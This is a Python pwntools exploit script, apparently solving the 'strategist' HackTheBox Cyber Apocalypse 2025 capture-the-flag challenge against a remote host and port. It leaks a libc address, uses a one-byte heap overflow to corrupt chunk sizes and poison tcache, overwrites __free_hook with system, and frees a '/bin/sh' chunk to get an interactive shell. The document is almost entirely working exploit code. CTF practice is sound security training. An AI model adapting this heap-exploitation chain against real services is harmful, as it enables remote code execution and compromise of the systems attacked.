#!/usr/bin/env python3

from pwn import *

exe = ELF("./strategist_patched")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-linux-x86-64.so.2", False)

context.binary = exe
gdb_script = '''
b *show_plan
b *delete_plan
b *edit_plan

'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdb_script)
    else:
        r = remote("94.237.51.163", 42733)

    return r

def create(p, size, data):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', str(size).encode())
        p.sendafter(b'> ', data)

def show(p, idx, delimiter):
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b'> ', str(idx).encode())
        p.recvuntil(f'Plan [{idx}]: '.encode()+delimiter)
        return p.recvline()[:-1]

def edit(p, idx, data):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'> ', str(idx).encode())
        p.sendafter(b'> ', data)

def delete(p, idx):
        p.sendlineafter(b'> ', b'4')
        p.sendlineafter(b'> ', str(idx).encode())



def main():
    p = conn()


    create(p, 0x511, b'aaaa')
    create(p, 0x20, b'/bin/sh\x00')

    delete(p, 0)

    create(p, 0x20, b'a'*0x8)
    libc_leak = u64(show(p, 0, b'a'*8).ljust(8, b'\x00'))
    libc.address = libc_leak - 0x3ec0d0
    
    info(f'libc leak: {hex(libc_leak)}')
    info(f'libc.address: {hex(libc.address)}')

    create(p, 0x28, b'a'*0x28)
    for i in range(3):
        create(p, 0x20, b'b'*0x20)

    edit(p, 2, b'd'*0x28+b'\x91')

    delete(p, 3)
    delete(p, 5)
    delete(p, 4)

    create(p, 0x80, b'e'*0x30+p64(libc.symbols.__free_hook))

    create(p, 0x20, b'ffff')
    create(p, 0x20, p64(libc.symbols.system))

    delete(p, 1)

    p.recvrepeat(1)
    print('*** SHELL ***')
    p.interactive()

if __name__ == "__main__":
    main()

## Shout out to https://negligble.medium.com/hackthebox-cyber-apocalypse-2025-strategist-47ac14524b14 
